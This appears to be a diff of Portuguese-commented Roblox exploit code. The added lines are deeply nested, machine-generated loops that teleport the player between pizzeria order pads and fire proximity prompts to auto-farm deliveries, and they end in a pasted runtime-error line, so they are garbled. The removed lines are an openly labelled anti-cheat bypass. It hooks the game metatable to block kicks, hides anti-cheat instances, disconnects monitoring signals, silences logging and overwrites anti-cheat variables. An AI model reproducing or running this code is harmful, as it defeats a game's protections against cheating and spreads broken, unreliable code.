+                                                                                            CFrame = CFrame.new(_1267),
+                                                                                        })
+
+                                                                                        _call1279:Play()
+                                                                                        _call1279.Completed:Wait()
+                                                                                        wait(0.3)
+                                                                                        fireproximityprompt(_1261_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                        print('Prompt no pad ativado.')
+                                                                                        wait(19.994920862838626)
+
+                                                                                        local _call1300 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                            CFrame = CFrame.new(_call20),
+                                                                                        })
+
+                                                                                        _call1300:Play()
+                                                                                        _call1300.Completed:Wait()
+                                                                                        wait(0.3)
+                                                                                        fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                        wait(2)
+
+                                                                                        for _1318, _1318_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                            _1318_2:FindFirstChild('OrderChar')
+
+                                                                                            local _1324 = (_1318_2.Position + Vector3.new(0, 3, 0))
+                                                                                            local _call1336 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1324).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                CFrame = CFrame.new(_1324),
+                                                                                            })
+
+                                                                                            _call1336:Play()
+                                                                                            _call1336.Completed:Wait()
+                                                                                            wait(0.3)
+                                                                                            fireproximityprompt(_1318_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                            print('Prompt no pad ativado.')
+                                                                                            wait(19.99513541534543)
+
+                                                                                            local _call1357 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                CFrame = CFrame.new(_call20),
+                                                                                            })
+
+                                                                                            _call1357:Play()
+                                                                                            _call1357.Completed:Wait()
+                                                                                            wait(0.3)
+                                                                                            fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                            wait(2)
+
+                                                                                            for _1375, _1375_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                _1375_2:FindFirstChild('OrderChar')
+
+                                                                                                local _1381 = (_1375_2.Position + Vector3.new(0, 3, 0))
+                                                                                                local _call1393 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1381).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                    CFrame = CFrame.new(_1381),
+                                                                                                })
+
+                                                                                                _call1393:Play()
+                                                                                                _call1393.Completed:Wait()
+                                                                                                wait(0.3)
+                                                                                                fireproximityprompt(_1375_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                print('Prompt no pad ativado.')
+                                                                                                wait(19.995218945434317)
+
+                                                                                                local _call1414 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                    CFrame = CFrame.new(_call20),
+                                                                                                })
+
+                                                                                                _call1414:Play()
+                                                                                                _call1414.Completed:Wait()
+                                                                                                wait(0.3)
+                                                                                                fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                wait(2)
+
+                                                                                                for _1432, _1432_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                    _1432_2:FindFirstChild('OrderChar')
+
+                                                                                                    local _1438 = (_1432_2.Position + Vector3.new(0, 3, 0))
+                                                                                                    local _call1450 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1438).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                        CFrame = CFrame.new(_1438),
+                                                                                                    })
+
+                                                                                                    _call1450:Play()
+                                                                                                    _call1450.Completed:Wait()
+                                                                                                    wait(0.3)
+                                                                                                    fireproximityprompt(_1432_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                    print('Prompt no pad ativado.')
+                                                                                                    wait(19.995678780367598)
+
+                                                                                                    local _call1471 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                        CFrame = CFrame.new(_call20),
+                                                                                                    })
+
+                                                                                                    _call1471:Play()
+                                                                                                    _call1471.Completed:Wait()
+                                                                                                    wait(0.3)
+                                                                                                    fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                    wait(2)
+
+                                                                                                    for _1489, _1489_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                        _1489_2:FindFirstChild('OrderChar')
+
+                                                                                                        local _1495 = (_1489_2.Position + Vector3.new(0, 3, 0))
+                                                                                                        local _call1507 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1495).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                            CFrame = CFrame.new(_1495),
+                                                                                                        })
+
+                                                                                                        _call1507:Play()
+                                                                                                        _call1507.Completed:Wait()
+                                                                                                        wait(0.3)
+                                                                                                        fireproximityprompt(_1489_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                        print('Prompt no pad ativado.')
+                                                                                                        wait(19.997345472685993)
+
+                                                                                                        local _call1528 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                            CFrame = CFrame.new(_call20),
+                                                                                                        })
+
+                                                                                                        _call1528:Play()
+                                                                                                        _call1528.Completed:Wait()
+                                                                                                        wait(0.3)
+                                                                                                        fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                        wait(2)
+
+                                                                                                        for _1546, _1546_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                            _1546_2:FindFirstChild('OrderChar')
+
+                                                                                                            local _1552 = (_1546_2.Position + Vector3.new(0, 3, 0))
+                                                                                                            local _call1564 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1552).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                CFrame = CFrame.new(_1552),
+                                                                                                            })
+
+                                                                                                            _call1564:Play()
+                                                                                                            _call1564.Completed:Wait()
+                                                                                                            wait(0.3)
+                                                                                                            fireproximityprompt(_1546_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                            print('Prompt no pad ativado.')
+                                                                                                            wait(19.997337371110916)
+
+                                                                                                            local _call1585 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                CFrame = CFrame.new(_call20),
+                                                                                                            })
+
+                                                                                                            _call1585:Play()
+                                                                                                            _call1585.Completed:Wait()
+                                                                                                            wait(0.3)
+                                                                                                            fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                            wait(2)
+
+                                                                                                            for _1603, _1603_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                _1603_2:FindFirstChild('OrderChar')
+
+                                                                                                                local _1609 = (_1603_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                local _call1621 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1609).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                    CFrame = CFrame.new(_1609),
+                                                                                                                })
+
+                                                                                                                _call1621:Play()
+                                                                                                                _call1621.Completed:Wait()
+                                                                                                                wait(0.3)
+                                                                                                                fireproximityprompt(_1603_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                print('Prompt no pad ativado.')
+                                                                                                                wait(19.997349383775145)
+
+                                                                                                                local _call1642 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                    CFrame = CFrame.new(_call20),
+                                                                                                                })
+
+                                                                                                                _call1642:Play()
+                                                                                                                _call1642.Completed:Wait()
+                                                                                                                wait(0.3)
+                                                                                                                fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                                wait(2)
+
+                                                                                                                for _1660, _1660_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                    _1660_2:FindFirstChild('OrderChar')
+
+                                                                                                                    local _1666 = (_1660_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                    local _call1678 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1666).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                        CFrame = CFrame.new(_1666),
+                                                                                                                    })
+
+                                                                                                                    _call1678:Play()
+                                                                                                                    _call1678.Completed:Wait()
+                                                                                                                    wait(0.3)
+                                                                                                                    fireproximityprompt(_1660_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                    print('Prompt no pad ativado.')
+                                                                                                                    wait(19.996908824890852)
+
+                                                                                                                    local _call1699 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                        CFrame = CFrame.new(_call20),
+                                                                                                                    })
+
+                                                                                                                    _call1699:Play()
+                                                                                                                    _call1699.Completed:Wait()
+                                                                                                                    wait(0.3)
+                                                                                                                    fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                                    wait(2)
+
+                                                                                                                    for _1717, _1717_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                        _1717_2:FindFirstChild('OrderChar')
+
+                                                                                                                        local _1723 = (_1717_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                        local _call1735 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1723).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                            CFrame = CFrame.new(_1723),
+                                                                                                                        })
+
+                                                                                                                        _call1735:Play()
+                                                                                                                        _call1735.Completed:Wait()
+                                                                                                                        wait(0.3)
+                                                                                                                        fireproximityprompt(_1717_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                        print('Prompt no pad ativado.')
+                                                                                                                        wait(19.996829764684662)
+
+                                                                                                                        local _call1756 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                            CFrame = CFrame.new(_call20),
+                                                                                                                        })
+
+                                                                                                                        _call1756:Play()
+                                                                                                                        _call1756.Completed:Wait()
+                                                                                                                        wait(0.3)
+                                                                                                                        fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                                        wait(2)
+
+                                                                                                                        for _1774, _1774_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                            _1774_2:FindFirstChild('OrderChar')
+
+                                                                                                                            local _1780 = (_1774_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                            local _call1792 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1780).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                CFrame = CFrame.new(_1780),
+                                                                                                                            })
+
+                                                                                                                            _call1792:Play()
+                                                                                                                            _call1792.Completed:Wait()
+                                                                                                                            wait(0.3)
+                                                                                                                            fireproximityprompt(_1774_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                            print('Prompt no pad ativado.')
+                                                                                                                            wait(19.997034539468586)
+
+                                                                                                                            local _call1813 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                CFrame = CFrame.new(_call20),
+                                                                                                                            })
+
+                                                                                                                            _call1813:Play()
+                                                                                                                            _call1813.Completed:Wait()
+                                                                                                                            wait(0.3)
+                                                                                                                            fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                                            wait(2)
+
+                                                                                                                            for _1831, _1831_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                                _1831_2:FindFirstChild('OrderChar')
+
+                                                                                                                                local _1837 = (_1831_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                                local _call1849 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1837).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                    CFrame = CFrame.new(_1837),
+                                                                                                                                })
+
+                                                                                                                                _call1849:Play()
+                                                                                                                                _call1849.Completed:Wait()
+                                                                                                                                wait(0.3)
+                                                                                                                                fireproximityprompt(_1831_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                                print('Prompt no pad ativado.')
+                                                                                                                                wait(19.996997104259208)
+
+                                                                                                                                local _call1870 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                    CFrame = CFrame.new(_call20),
+                                                                                                                                })
+
+                                                                                                                                _call1870:Play()
+                                                                                                                                _call1870.Completed:Wait()
+                                                                                                                                wait(0.3)
+                                                                                                                                fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                                                wait(2)
+
+                                                                                                                                for _1888, _1888_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                                    _1888_2:FindFirstChild('OrderChar')
+
+                                                                                                                                    local _1894 = (_1888_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                                    local _call1906 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1894).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                        CFrame = CFrame.new(_1894),
+                                                                                                                                    })
+
+                                                                                                                                    _call1906:Play()
+                                                                                                                                    _call1906.Completed:Wait()
+                                                                                                                                    wait(0.3)
+                                                                                                                                    fireproximityprompt(_1888_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                                    print('Prompt no pad ativado.')
+                                                                                                                                    wait(19.997177015524358)
+
+                                                                                                                                    local _call1927 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                        CFrame = CFrame.new(_call20),
+                                                                                                                                    })
+
+                                                                                                                                    _call1927:Play()
+                                                                                                                                    _call1927.Completed:Wait()
+                                                                                                                                    wait(0.3)
+                                                                                                                                    fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                                                    wait(2)
+
+                                                                                                                                    for _1945, _1945_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                                        _1945_2:FindFirstChild('OrderChar')
+
+                                                                                                                                        local _1951 = (_1945_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                                        local _call1963 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _1951).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                            CFrame = CFrame.new(_1951),
+                                                                                                                                        })
+
+                                                                                                                                        _call1963:Play()
+                                                                                                                                        _call1963.Completed:Wait()
+                                                                                                                                        wait(0.3)
+                                                                                                                                        fireproximityprompt(_1945_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                                        print('Prompt no pad ativado.')
+                                                                                                                                        wait(19.997026158263907)
+
+                                                                                                                                        local _call1984 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                            CFrame = CFrame.new(_call20),
+                                                                                                                                        })
+
+                                                                                                                                        _call1984:Play()
+                                                                                                                                        _call1984.Completed:Wait()
+                                                                                                                                        wait(0.3)
+                                                                                                                                        fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                                                        wait(2)
+
+                                                                                                                                        for _2002, _2002_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                                            _2002_2:FindFirstChild('OrderChar')
+
+                                                                                                                                            local _2008 = (_2002_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                                            local _call2020 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _2008).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                                CFrame = CFrame.new(_2008),
+                                                                                                                                            })
+
+                                                                                                                                            _call2020:Play()
+                                                                                                                                            _call2020.Completed:Wait()
+                                                                                                                                            wait(0.3)
+                                                                                                                                            fireproximityprompt(_2002_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                                            print('Prompt no pad ativado.')
+                                                                                                                                            wait(19.996199237648398)
+
+                                                                                                                                            local _call2041 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                                CFrame = CFrame.new(_call20),
+                                                                                                                                            })
+
+                                                                                                                                            _call2041:Play()
+                                                                                                                                            _call2041.Completed:Wait()
+                                                                                                                                            wait(0.3)
+                                                                                                                                            fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                                                            wait(2)
+
+                                                                                                                                            for _2059, _2059_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                                                _2059_2:FindFirstChild('OrderChar')
+
+                                                                                                                                                local _2065 = (_2059_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                                                local _call2077 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _2065).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                                    CFrame = CFrame.new(_2065),
+                                                                                                                                                })
+
+                                                                                                                                                _call2077:Play()
+                                                                                                                                                _call2077.Completed:Wait()
+                                                                                                                                                wait(0.3)
+                                                                                                                                                fireproximityprompt(_2059_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                                                print('Prompt no pad ativado.')
+                                                                                                                                                wait(19.996586716966704)
+
+                                                                                                                                                local _call2098 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                                    CFrame = CFrame.new(_call20),
+                                                                                                                                                })
+
+                                                                                                                                                _call2098:Play()
+                                                                                                                                                _call2098.Completed:Wait()
+                                                                                                                                                wait(0.3)
+                                                                                                                                                fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                                                                wait(2)
+
+                                                                                                                                                for _2116, _2116_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                                                    _2116_2:FindFirstChild('OrderChar')
+
+                                                                                                                                                    local _2122 = (_2116_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                                                    local _call2134 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _2122).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                                        CFrame = CFrame.new(_2122),
+                                                                                                                                                    })
+
+                                                                                                                                                    _call2134:Play()
+                                                                                                                                                    _call2134.Completed:Wait()
+                                                                                                                                                    wait(0.3)
+                                                                                                                                                    fireproximityprompt(_2116_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                                                    print('Prompt no pad ativado.')
+                                                                                                                                                    wait(19.996922234538943)
+
+                                                                                                                                                    local _call2155 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                                        CFrame = CFrame.new(_call20),
+                                                                                                                                                    })
+
+                                                                                                                                                    _call2155:Play()
+                                                                                                                                                    _call2155.Completed:Wait()
+                                                                                                                                                    wait(0.3)
+                                                                                                                                                    fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                                                                    wait(2)
+
+                                                                                                                                                    for _2173, _2173_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                                                        _2173_2:FindFirstChild('OrderChar')
+
+                                                                                                                                                        local _2179 = (_2173_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                                                        local _call2191 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _2179).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                                            CFrame = CFrame.new(_2179),
+                                                                                                                                                        })
+
+                                                                                                                                                        _call2191:Play()
+                                                                                                                                                        _call2191.Completed:Wait()
+                                                                                                                                                        wait(0.3)
+                                                                                                                                                        fireproximityprompt(_2173_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                                                        print('Prompt no pad ativado.')
+                                                                                                                                                        wait(19.996341434307396)
+
+                                                                                                                                                        local _call2212 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                                            CFrame = CFrame.new(_call20),
+                                                                                                                                                        })
+
+                                                                                                                                                        _call2212:Play()
+                                                                                                                                                        _call2212.Completed:Wait()
+                                                                                                                                                        wait(0.3)
+                                                                                                                                                        fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                                                                        wait(2)
+
+                                                                                                                                                        for _2230, _2230_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                                                            _2230_2:FindFirstChild('OrderChar')
+
+                                                                                                                                                            local _2236 = (_2230_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                                                            local _call2248 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _2236).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                                                CFrame = CFrame.new(_2236),
+                                                                                                                                                            })
+
+                                                                                                                                                            _call2248:Play()
+                                                                                                                                                            _call2248.Completed:Wait()
+                                                                                                                                                            wait(0.3)
+                                                                                                                                                            fireproximityprompt(_2230_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                                                            print('Prompt no pad ativado.')
+                                                                                                                                                            wait(19.99607408209704)
+
+                                                                                                                                                            local _call2269 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                                                CFrame = CFrame.new(_call20),
+                                                                                                                                                            })
+
+                                                                                                                                                            _call2269:Play()
+                                                                                                                                                            _call2269.Completed:Wait()
+                                                                                                                                                            wait(0.3)
+                                                                                                                                                            fireproximityprompt(workspace.Construcoes.Pizzaria.ifoodplace.Pizza3:FindFirstChild('ProximityPrompt', true))
+                                                                                                                                                            wait(2)
+
+                                                                                                                                                            for _2287, _2287_2 in ipairs(workspace.Construcoes.Pizzaria.OrderCharSpawns:GetChildren())do
+                                                                                                                                                                _2287_2:FindFirstChild('OrderChar')
+
+                                                                                                                                                                local _2293 = (_2287_2.Position + Vector3.new(0, 3, 0))
+                                                                                                                                                                local _call2305 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _2293).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                                                    CFrame = CFrame.new(_2293),
+                                                                                                                                                                })
+
+                                                                                                                                                                _call2305:Play()
+                                                                                                                                                                _call2305.Completed:Wait()
+                                                                                                                                                                wait(0.3)
+                                                                                                                                                                fireproximityprompt(_2287_2:FindFirstChildWhichIsA('ProximityPrompt', true))
+                                                                                                                                                                print('Prompt no pad ativado.')
+                                                                                                                                                                wait(19.99673478072509)
+
+                                                                                                                                                                local _call2326 = _call22:Create(_call30, TweenInfo.new(((_call30.Position - _call20).Magnitude / 75), Enum.EasingStyle.Linear), {
+                                                                                                                                                                    CFrame = CFrame.new(_call20),
+                                                                                                                                                                })
+
+                                                                                                                                                                _call2326:Play()
+                                                                                                                                                                _call2326.Completed:Wait()
+                                                                                                                                                                wait(0.3)
+
+                                                                                                                                                                local _ = workspace.Construcoes.Pizzaria.ifoodplace.Pizza3
+
+                                                                                                                                                                error("line 2: runtime error: internal 557: <25ms: infinitelooperror>\nstack traceback:\n\t[C]: in function 'error'\n\tinternal 557: in ?\n\tinternal 609: in function '__index'\n\tline 2: in ?\n\tline 2: in ?")
+                                                                                                                                                            end
+                                                                                                                                                        end
+                                                                                                                                                    end
+                                                                                                                                                end
+                                                                                                                                            end
+                                                                                                                                        end
+                                                                                                                                    end
+                                                                                                                                end
+                                                                                                                            end
+                                                                                                                        end
+                                                                                                                    end
+                                                                                                                end
+                                                                                                            end
+                                                                                                        end
+                                                                                                    end
+                                                                                                end
+                                                                                            end
+                                                                                        end
+                                                                                    end
+                                                                                end
+                                                                            end
+                                                                        end
+                                                                    end
+                                                                end
+                                                            end
+                                                        end
+                                                    end
+                                                end
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
                 end
-            end)
-        end
-    end)
-end
-
-GuiService.ErrorMessageChanged:Connect(function()
-    AdvancedBypassAPI:RejoinClient()
-end)
-
-LogService.MessageOut:Connect(function(msg)
-    if msg:find("Server Kick Message:") then
-        AdvancedBypassAPI:RejoinClient()
-    end
-end)
-
--- Bloqueia instâncias críticas
-for _, name in ipairs(BlockedRemotes) do
-    local inst = Workspace:FindFirstChild(name) or ReplicatedStorage:FindFirstChild(name) or LocalPlayer.PlayerScripts:FindFirstChild(name)
-    if inst then BlockedInstances[name] = inst end
-end
-
--- Cria sinal dummy fake
-local function makeDummySignal()
-    local dummy = {}
-    function dummy:Connect() return { Disconnect = function() end } end
-    return dummy
-end
-
--- Desativa sinais de propriedade em instâncias protegidas
-local function disablePropertySignals(inst, props)
-    for _, prop in ipairs(props) do
-        local signal = inst:GetPropertyChangedSignal(prop)
-        for _, conn in ipairs(getconnections(signal)) do
-            pcall(function()
-                if conn.Disable then conn:Disable() end
-                if conn.Disconnect then conn:Disconnect() end
-            end)
-        end
-    end
-end
-
-if ChatService  then disablePropertySignals(ChatService,  {"Parent", "Disabled", "Name"}) end
-if ChatService2 then disablePropertySignals(ChatService2, {"Parent", "Disabled", "Name"}) end
-if TesteAnti    then disablePropertySignals(TesteAnti,    {"Parent", "Name"}) end
-
--- ────────────────────────────────────────
---       HOOK DE METATABLE (principal bypass)
--- ────────────────────────────────────────
-
-local getrawmetatable = getrawmetatable or debug.getmetatable
-local make_writeable = make_writeable or setreadonly or changereadonly or change_writeable
-
-local gameMeta = getrawmetatable(game)
-local originalIndex    = gameMeta.__index
-local originalNamecall = gameMeta.__namecall
-
-make_writeable(gameMeta, false)
-
-gameMeta.__index = newcclosure(function(self, key, ...)
-    if key == "Parent" and BlockedInstances[self.Name] and not checkcaller() then
-        return originalIndex(BlockedInstances[self.Name], "Parent") or game
-    end
-
-    if key == "Kick" and self == LocalPlayer and BlockedKeys[key] and not checkcaller() then
-        return true
-    end
-
-    if BlockedKeys[key] and BlockedInstances[self.Name] and not checkcaller() then
-        if key == "GetPropertyChangedSignal" or key == "AncestryChanged" then
-            return function() return makeDummySignal() end
-        elseif key:match("^FindFirstChild") or key == "WaitForChild" then
-            return function(_, childName)
-                if childName == self.Name then
-                    return BlockedInstances[self.Name]
-                end
-                return nil
             end
-        elseif key == "IsDescendantOf" then
-            return function() return true end
-        else
-            return function() return nil end
         end
     end
-
-    return originalIndex(self, key, ...)
-end)
-
-gameMeta.__namecall = newcclosure(function(self, ...)
-    local method = getnamecallmethod()
-
-    if BlockedKeys[method] and self == LocalPlayer and method == "Kick" and not checkcaller() then
-        return true
-    end
-
-    if BlockedKeys[method] and BlockedInstances[self.Name] and not checkcaller() then
-        if method == "GetPropertyChangedSignal" or method == "AncestryChanged" then
-            return makeDummySignal()
-        elseif method == "WaitForChild" or method:match("^FindFirstChild") then
-            local args = {...}
-            if args[1] == self.Name then
-                return BlockedInstances[self.Name]
-            end
-            return nil
-        elseif method == "IsDescendantOf" then
-            return true
-        else
-            return nil
-        end
-    end
-
-    return originalNamecall(self, ...)
-end)
-
-make_writeable(gameMeta, true)
-
--- Hook de funções de log (warn, print, error)
-local old_warn  = hookfunction(warn,  function(...) if checkcaller() then return end return old_warn(...)  end)
-local old_print = hookfunction(print, function(...) if checkcaller() then return end return old_print(...) end)
-local old_error = hookfunction(error, function(...) if checkcaller() then return end return old_error(...) end)
-
--- Desativa chat service
-task.wait(1)
-if ChatService  then ChatService.Disabled  = true end
-if ChatService2 then ChatService2.Disabled = true end
-
--- Tentativa de desativar variáveis de anti-cheat no PlayerScripts
-task.defer(function()
-    wait(1)
-    for _, scr in ipairs(LocalPlayer.PlayerScripts:GetDescendants()) do
-        if scr:IsA("LocalScript") then
-            pcall(function()
-                local env = getfenv(scr)
-                if env.u9 ~= nil then env.u9 = false end  -- anti-hitbox?
-                if env.u8 ~= nil then env.u8 = false end  -- anti-headsize?
-            end)
-        end
-    end
-end)
-
-print("✅ Sistema de bypass carregado com sucesso!")
+end
